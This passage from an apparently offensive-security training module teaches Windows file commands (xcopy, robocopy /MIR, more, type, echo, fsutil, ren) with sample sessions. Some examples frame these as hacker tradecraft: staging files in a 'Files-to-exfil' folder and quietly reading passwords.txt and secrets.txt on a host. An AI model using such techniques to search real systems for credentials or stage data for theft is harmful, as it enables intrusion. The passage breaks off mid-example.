<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop&gt; xcopy C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\ </span>/E

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\f</span>ile-1 - Copy.txt
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\f</span>ile-1.txt
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\f</span>ile-2.txt
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\f</span>ile-3.txt
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\f</span>ile-5.txt
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\‎</span>file-4.txt
6 File(s) copied
</code></pre>
<p>Xcopy prompts us during the process and displays the result. In our case, the directory and any files within were copied to the Desktop. Utilizing the <code>/E</code> switch, we told Xcopy to copy any files and subdirectories to include empty directories. Keep in mind this will not delete the copy in the previous directory. When performing the duplication, xcopy will reset any attributes the file had. If you wish to retain the file&#39;s attributes ( such as read-only or hidden ), you can use the <code>/K</code> switch.</p>
<p>From a hacker&#39;s perspective, xcopy can be extremely helpful. If we wish to move a file, even a system file, or something locked, xcopy can do this without adding other tools to the host. As a defender, this is a great way to grab a copy of a file and retain the same state for analysis. For example, you wish to grab a read-only file that was transferred in from a CD or flash drive, and you now suspect it of performing suspicious actions.</p>
<p><code>Robocopy</code> is xcopy&#39;s successor built with much more capability. We can think of Robocopy as merging the best parts of copy, xcopy, and move spiced up with a few extra capabilities. Robocopy can copy and move files locally, to different drives, and even across a network while retaining the file data and attributes to include timestamps, ownership, ACLs, and any flags set like hidden or read-only. We need to be aware that Robocopy was made for large directories and drive syncing, so it does not like to copy or move singular files by default. That is not to say it is incapable, however. We will cover a bit of that down below.</p>
<p><strong>Robocopy Basic</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span>&gt; robocopy C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span> C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>
robocopy C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span> C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span>

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, June 21, 2021 11:05:46 AM
   Source : C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>     Dest : C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>
    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /R:1000000 /W:30

------------------------------------------------------------------------------

                           7    C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>        *EXTRA Dir        -1    C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">My</span></span> Music<span class="hljs-tag">\<span class="hljs-name">
</span></span>        *EXTRA Dir        -1    C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">My</span></span> Pictures<span class="hljs-tag">\<span class="hljs-name">
</span></span>        *EXTRA Dir        -1    C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">My</span></span> Videos<span class="hljs-tag">\<span class="hljs-name">
</span></span>100<span class="hljs-comment">%        Older                    282        desktop.ini</span>
100<span class="hljs-comment">%        New File                  19        file.txt</span>
100<span class="hljs-comment">%        New File                  26        normal-file.txt</span>
100<span class="hljs-comment">%        New File                  97        passwords.txt</span>
100<span class="hljs-comment">%        New File                  97        Project plans.txt</span>
100<span class="hljs-comment">%        New File                 114        secrets.txt</span>
100<span class="hljs-comment">%        New File               38380        Windows Startup.wav</span>

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         3
   Files :         7         7         0         0         0         0
   Bytes :    38.1 k    38.1 k         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :              619285 Bytes/sec.
   Speed :              35.435 MegaBytes/min.
   Ended : Monday, June 21, 2021 11:05:46 AM


C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span>&gt;dir C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span>
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span>

06/21/2021  11:05 AM    &lt;DIR&gt;          .
06/21/2021  11:05 AM    &lt;DIR&gt;          ..
06/14/2021  10:37 PM                19 file.txt
06/14/2021  10:59 PM                26 normal-file.txt
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
12/07/2019  05:08 AM            38,380 Windows Startup.wav
               6 File(s)         38,733 bytes
               2 Dir(s)  38,285,684,736 bytes free
</code></pre>
<p>Robocopy took everything in our Desktop directory and made a copy of it in the Documents directory. This works without any issues because we have permission over the folder we are trying to copy currently. As discussed earlier, Robocopy can also work with system, read-only, and hidden files. As a user, this can be problematic if we do not have the <code>SeBackupPrivilege</code> and <code>auditing privilege</code> attributes. This could stop us from duplicating or moving files and directories. There is a bit of a workaround, however. We can utilize the <code>/MIR</code> switch to permit ourselves to copy the files we need temporarily.</p>
<p><strong>Robocopy Backup Mode Fail</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; robocopy /E /B /L C:\Users\htb\Desktop\example C:\Users\htb\Documents\Backup\

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                    
-------------------------------------------------------------------------------

  Started : Monday, June 21, 2021 10:03:56 PM
   Source : C:\Users\htb\Desktop\example\
     Dest : C:\Users\htb\Documents\Backup\

    Files : *.*

  Options : *.* /L /S /E /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

<span class="hljs-keyword">ERROR </span>: You do not have the Backup and Restore Files user rights.
*****  You need these to perform Backup copies (/B or /ZB).

<span class="hljs-keyword">ERROR </span>: Robocopy ran out of memory, exiting.
<span class="hljs-keyword">ERROR </span>: Invalid Parameter #%d : "%s"

<span class="hljs-keyword">ERROR </span>: Invalid Job File, Line #%d :"%s"


  Started : %s %s

   Source %c

     Dest %c
       Simple Usage :: ROBOCOPY source destination /MIR

             source :: Source Directory (drive:\path or \\server\share\path).
        destination :: Destination Dir  (drive:\path or \\server\share\path).
               /MIR :: Mirror a complete directory tree.

    For more usage information run ROBOCOPY /?


****  /MIR can DELETE files as well as copy them !
</code></pre>
<p>From the output above, we can see that our permissions are insufficient. Utilizing the /MIR switch will complete the task for us. Be aware that it will mark the files as a system backup and hide them from view. We can clear the additional attributes if we add the <code>/A-:SH</code> switch to our command. Be careful of the <code>/MIR</code> switch, as it will mirror the destination directory to the source. Any file that exists within the destination will be removed. Ensure you place the new copy in a cleared folder. Above, we also used the <code>/L</code> switch. This is a what-if command. It will process the command you issue but not execute it; it just shows you the potential result. Let us give it a try below.</p>
<p><strong>Robocopy /MIR</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span>&gt; robocopy /E /MIR /A-:SH C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">notes</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">Backup</span></span><span class="hljs-tag">\<span class="hljs-name">Files</span></span>-to-exfil<span class="hljs-tag">\<span class="hljs-name">
</span></span>
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                    
-------------------------------------------------------------------------------

  Started : Monday, June 21, 2021 10:45:46 PM
   Source : C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">notes</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>     Dest : C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">Backup</span></span><span class="hljs-tag">\<span class="hljs-name">Files</span></span>-to-exfil<span class="hljs-tag">\<span class="hljs-name">
</span></span>
    Files : *.*

  Options : *.* /S /E /DCOPY:DA /COPY:DAT /PURGE /MIR /A-:SH /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">notes</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>100<span class="hljs-comment">%        New File                  16        python-notes</span>
100<span class="hljs-comment">%        New File                  13        vscode</span>

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         2         0         0         0         0
   Bytes :        29        29         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Monday, June 21, 2021 10:45:46 PM


C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">Backup</span></span><span class="hljs-tag">\<span class="hljs-name">Files</span></span>-to-exfil&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">Backup</span></span><span class="hljs-tag">\<span class="hljs-name">Files</span></span>-to-exfil

06/21/2021  10:45 PM    &lt;DIR&gt;          .
06/21/2021  10:45 PM    &lt;DIR&gt;          ..
06/15/2021  09:29 PM                16 python-notes
06/15/2021  09:28 PM                13 vscode
               2 File(s)             29 bytes
               2 Dir(s)  38,285,676,544 bytes free
</code></pre>
<p>Running our command and then checking the directory shows us that the files copied over successfully. There are so many ways we can utilize Robocopy that it needs its own section. Experiment and play with the tool to develop some of your ways to move directories, copy files, and even play with attributes.</p>
<hr>
<h3 id="files">Files</h3>
<p>Many of the same commands we utilized while administering directories can also be used with files. Windows has plenty more built-in tools we can use for all our file magic fun. We will cover a few of them here. We should first discuss how to view files and their contents.</p>
<h4 id="list-files-view-their-contents">List Files &amp; View Their Contents</h4>
<p>We already know we can utilize the <code>dir</code> command to view the files within a directory, along with specific information about them, depending on the switches we use. It is often the easiest way to see what files exist within a directory. We also have the <code>tree /F</code> command to show us an output containing all directories and files within the tree. Nevertheless, what if we wish to view the contents of a file? We can utilize the <code>more</code>, <code>openfiles</code>, and <code>type</code> commands.</p>
<p>First up is <code>more</code>. With this built-in tool, we can view the contents of a file or the results of another command printed to it one screen at a time. Think of it as a way to buffer scrolling text that may otherwise overflow the terminal buffer.</p>
<p><strong>More</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Documents\Backup&gt; more secrets.txt

The TVA has several copies <span class="hljs-keyword">of</span> the Infinity Stones..


Bucky <span class="hljs-keyword">is</span> a good guy. TWS <span class="hljs-keyword">is</span> a Bo$$


The sky isn<span class="hljs-symbol">'t</span> blue..


<span class="hljs-comment">-- More (6%) --</span>
</code></pre>
<p>Notice that the bottom of the cmd-session shows us the percentage of the file being viewed. as we hit <code>enter</code> or the <code>space bar</code>, it will scroll the document&#39;s text for us, showing an increasing amount of the file in view. With large files containing multiple blank lines or a large amount of empty space between data, we can use the <code>/S</code> option to crunch that blank space down to a single line at each point to make it easier to view. This will not modify the file, just like the <code>more</code> command outputs blank space.</p>
<p><strong>More /S</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Documents\Backup&gt; more /S secrets.txt

The TVA has several copies <span class="hljs-keyword">of</span> the Infinity Stones..

Bucky <span class="hljs-keyword">is</span> a good guy. TWS <span class="hljs-keyword">is</span> a Bo$$

The sky isn<span class="hljs-symbol">'t</span> blue..

Windows IP Configuration

   Host Name . . . . . . . . . . . . : <span class="hljs-type">DESKTOP</span>-LSM3BSF
   Primary Dns Suffix  . . . . . . . :
   <span class="hljs-type">Node</span> <span class="hljs-keyword">Type</span> <span class="hljs-type">. </span>. . . . . . . . . . . : <span class="hljs-type">Hybrid</span>
   IP Routing Enabled. . . . . . . . : <span class="hljs-type">No</span>
   WINS Proxy Enabled. . . . . . . . : <span class="hljs-type">No</span>
   DNS Suffix Search List. . . . . . : <span class="hljs-type">lan</span>

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : <span class="hljs-type">lan</span>
   Description . . . . . . . . . . . : <span class="hljs-type">Intel</span>(R) <span class="hljs-number">82574</span>L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0<span class="hljs-type">C</span>-<span class="hljs-number">29</span>-D7-<span class="hljs-number">67</span>-BF
<span class="hljs-comment">-- More (27%) --</span>
</code></pre>
<p>Notice how we have much more of the file in our first window view. More took a large amount of blank space and compressed it.</p>
<p><strong>Sending a Command Output to More</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\&gt; ipconfig /<span class="hljs-keyword">all</span> | more

Windows IP Configuration

   Host Name . . . . . . . . . . . . : <span class="hljs-type">DESKTOP</span>-LSM3BSF
   Primary Dns Suffix  . . . . . . . :
   <span class="hljs-type">Node</span> <span class="hljs-keyword">Type</span> <span class="hljs-type">. </span>. . . . . . . . . . . : <span class="hljs-type">Hybrid</span>
   IP Routing Enabled. . . . . . . . : <span class="hljs-type">No</span>
   WINS Proxy Enabled. . . . . . . . : <span class="hljs-type">No</span>
   DNS Suffix Search List. . . . . . : <span class="hljs-type">lan</span>

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : <span class="hljs-type">lan</span>
   Description . . . . . . . . . . . : <span class="hljs-type">Intel</span>(R) <span class="hljs-number">82574</span>L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0<span class="hljs-type">C</span>-<span class="hljs-number">29</span>-D7-<span class="hljs-number">67</span>-BF
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">Yes</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
   Link-local IPv6 Address . . . . . : <span class="hljs-type">fe80</span>::<span class="hljs-number">59</span>fe:<span class="hljs-number">9</span>ed2:fea6:<span class="hljs-number">1371</span>%<span class="hljs-number">5</span>(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.146.5(<span class="hljs-type">Preferred</span>)
<span class="hljs-comment">-- More  --</span>
</code></pre>
<p>In the output above, we issued the <code>ipconfig /all</code> command which generally outputs a bunch of data, and piped (<code>|</code>) through <code>more</code> to slow it down. This is especially handy when dealing with large files or commands that generate a lot of text, such as <code>systeminfo</code>.</p>
<p>With <code>openfiles</code>, we can see what file on our local pc or a remote host has open and from which user. This command requires administrator privileges on the host you are trying to view. With this tool, we can view open files, disconnect open files, and even kick users from accessing specific files. The ability to use this command is not enabled by default on Windows systems.</p>
<p><code>Type</code> can display the contents of multiple text files at once. It is also possible to utilize fire redirection with type as well. It is a simple tool but extremely handy. One interesting thing about type is that it will not lock files, so there is no worry of messing something up.</p>
<p><strong>Type</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt;<span class="hljs-keyword">type</span> bio.txt

James Buchanan <span class="hljs-string">"Bucky"</span> Barnes Jr. <span class="hljs-keyword">is</span> a fictional <span class="hljs-built_in">character</span> appearing <span class="hljs-keyword">in</span> American comic books published by Marvel Comics. Originally introduced as a sidekick <span class="hljs-keyword">to</span> Captain America, the <span class="hljs-built_in">character</span> was created by Joe Simon <span class="hljs-keyword">and</span> Jack Kirby <span class="hljs-keyword">and</span> first appeared <span class="hljs-keyword">in</span> Captain America Comics #<span class="hljs-number">1</span> (<span class="hljs-keyword">cover</span>-dated March <span class="hljs-number">1941</span>) (which was published by Marvel<span class="hljs-symbol">'s</span> predecessor, Timely Comics). Barnes' original costume (<span class="hljs-keyword">or</span> one based <span class="hljs-keyword">on</span> it) <span class="hljs-keyword">and</span> the Bucky nickname have been used by other superheroes <span class="hljs-keyword">in</span> the Marvel Universe over the years.[<span class="hljs-number">1</span>] The <span class="hljs-built_in">character</span> <span class="hljs-keyword">is</span> brought back from supposed death as the brainwashed assassin cyborg called Winter Soldier (Russian: ╨ù╨╕╨╝╨╜╨╕╨╣ ╨í╨╛╨╗╨┤╨░╤é, translit. Zimniy Sold├ít). The <span class="hljs-built_in">character</span><span class="hljs-symbol">'s</span> memories <span class="hljs-keyword">and</span> personality are later restored, leading him <span class="hljs-keyword">to</span> become a dark hero <span class="hljs-keyword">in</span> search <span class="hljs-keyword">of</span> redemption. He temporarily assumes the role <span class="hljs-keyword">of</span> <span class="hljs-string">"Captain America"</span> <span class="hljs-keyword">when</span> Steve Rogers was presumed <span class="hljs-keyword">to</span> be dead. During the <span class="hljs-number">2011</span> crossover Fear Itself, Barnes <span class="hljs-keyword">is</span> injected <span class="hljs-keyword">with</span> the Infinity Formula, which increases his <span class="hljs-built_in">natural</span> vitality <span class="hljs-keyword">and</span> physical traits <span class="hljs-keyword">in</span> a way that <span class="hljs-keyword">is</span> similar <span class="hljs-keyword">to</span> (but less powerful than) the super-soldier serum used <span class="hljs-keyword">on</span> Captain America.[<span class="hljs-number">2</span>]
</code></pre>
<p>That is all there is to it. Type provides Simple file output. We can also use it to send output to another file. This can be a quick way to write a new file or append data to another file.</p>
<h4 id="redirect-with-type">Redirect With Type</h4>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt;<span class="hljs-keyword">type</span> <span class="hljs-type">passwords.txt </span>&gt;&gt; secrets.txt

C:\Users\htb\Desktop&gt;<span class="hljs-keyword">type</span> <span class="hljs-type">secrets.txt

</span>The TVA has several copies <span class="hljs-keyword">of</span> the Infinity Stones..
Bucky <span class="hljs-keyword">is</span> a good guy. TWS <span class="hljs-keyword">is</span> a Bo$$
The sky isn<span class="hljs-symbol">'t</span> blue..
<span class="hljs-string">" so many passwords in the file.. "</span>
Password P@ssw0rd Super$ecr3t Admin @dmin123 Summer2021!
</code></pre>
<p>With the example above, we appended the passwords.txt file to the end of the secrets.txt file with <code>&gt;&gt;</code>. Then we viewed the contents of secrets.txt and can see our data was successfully added.</p>
<p>We have been discussing a relatively simple topic, but it is a crucial part of any administrator or hacker&#39;s job. Utilizing built-in tools such as <code>type</code> and <code>more</code> to poke around in a host filesystem is a quick and reasonably unnoticeable way to look for passwords, company rosters, or other potentially sensitive information.</p>
<h4 id="create-and-modify-a-file">Create And Modify A File</h4>
<p>Creating and modifying a file from the command line is relatively easy. We have several options that include <code>echo</code>, <code>fsutil</code>, <code>ren</code>, <code>rename</code>, and <code>replace</code>. First, <code>echo</code> with output redirection allows us to modify a file if it already exists or create a new file at the time of the call.</p>
<p><strong>Echo to Create and Append Files</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt;echo Check <span class="hljs-keyword">out</span> this <span class="hljs-literal">text</span> &gt; demo.txt

C:\Users\htb\Desktop&gt;<span class="hljs-keyword">type</span> demo.txt
Check <span class="hljs-keyword">out</span> this <span class="hljs-literal">text</span>

C:\Users\htb\Desktop&gt;echo More <span class="hljs-literal">text</span> <span class="hljs-keyword">for</span> our demo <span class="hljs-keyword">file</span> &gt;&gt; demo.txt

C:\Users\htb\Desktop&gt;<span class="hljs-keyword">type</span> demo.txt
Check <span class="hljs-keyword">out</span> this <span class="hljs-literal">text</span>
More <span class="hljs-literal">text</span> <span class="hljs-keyword">for</span> our demo <span class="hljs-keyword">file</span>
</code></pre>
<p>With <code>fsutil</code>, we can do many things, but in this instance, we will use it to create a file.</p>
<p><strong>Fsutil to Create a file</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt;fsutil file createNew <span class="hljs-keyword">for</span>-sure<span class="hljs-selector-class">.txt</span> <span class="hljs-number">222</span>
File C:\Users\htb\Desktop\<span class="hljs-keyword">for</span>-sure<span class="hljs-selector-class">.txt</span> is created

C:\Users\htb\Desktop&gt;echo <span class="hljs-string">" my super cool text file from fsutil "</span>&gt; <span class="hljs-keyword">for</span>-sure<span class="hljs-selector-class">.txt</span>

C:\Users\htb\Desktop&gt;type <span class="hljs-keyword">for</span>-sure<span class="hljs-selector-class">.txt</span>
<span class="hljs-string">" my super cool text file from fsutil "</span>
</code></pre>
<p><code>Ren</code> allows us to change the name of a file to something new.</p>
<p><strong>Ren(ame) A file</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; ren demo.txt superdemo.txt

C:\Users\htb\Desktop&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Desktop

<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">04</span>:<span class="hljs-number">25</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">04</span>:<span class="hljs-number">25</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">21</span> PM             <span class="hljs-number">1</span>,<span class="hljs-number">140</span> bio.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">36</span> PM    &lt;DIR&gt;          example
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">37</span> PM                <span class="hljs-number">19</span> <span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">04</span>:<span class="hljs-number">12</span> PM                <span class="hljs-number">41</span> <span class="hljs-keyword">for</span>-sure.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">59</span> PM                <span class="hljs-number">12</span> maybe.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">26</span> PM    &lt;DIR&gt;          <span class="hljs-keyword">new</span>-directory
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">48</span> PM                 <span class="hljs-number">9</span> nono.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">59</span> PM                <span class="hljs-number">26</span> normal-<span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Notes
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM                <span class="hljs-number">97</span> passwords.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM                <span class="hljs-number">97</span> <span class="hljs-keyword">Project</span> plans.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">24</span> PM               <span class="hljs-number">211</span> secrets.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">04</span>:<span class="hljs-number">14</span> PM                <span class="hljs-number">52</span> superdemo.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">18</span> PM             <span class="hljs-number">2</span>,<span class="hljs-number">534</span> type.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">33</span> AM                 <span class="hljs-number">0</span> why-tho.txt
<span class="hljs-number">12</span><span class="hljs-regexp">/07/</span><span class="hljs-number">2019</span>  <span class="hljs-number">05</span>:<span class="hljs-number">08</span> AM            <span class="hljs-number">38</span>,<span class="hljs-number">380</span> Windows Startup.wav
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Work-Policies
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          yet-another-dir
              <span class="hljs-number">13</span> <span class="hljs-keyword">File</span>(s)         <span class="hljs-number">42</span>,<span class="hljs-number">618</span> bytes
               <span class="hljs-number">7</span> Dir(s)  <span class="hljs-number">39</span>,<span class="hljs-number">091</span>,<span class="hljs-number">531</span>,<span class="hljs-number">776</span> bytes free
</code></pre>
<p>We utilized <code>ren</code> to change the name of demo.txt to superdemo.txt. It can be issued as <code>ren</code> or rename. They are links to the same basic command.</p>
<h4 id="input-output">Input / Output</h4>
<p>We have seen this a few times already, but let us take a minute to talk about I/O. We can utilize the <code>&lt;</code>, <code>&gt;</code>, <code>|</code>, and <code>&amp;</code> to send input and output from the console and files to where we need them. With <code>&gt;</code> we can push the output of a command to a file.</p>
<p><strong>Output To A File</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Documents&gt;dir
 Volume <span class="hljs-keyword">in</span> drive C has no <span class="hljs-selector-tag">label</span>.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Documents
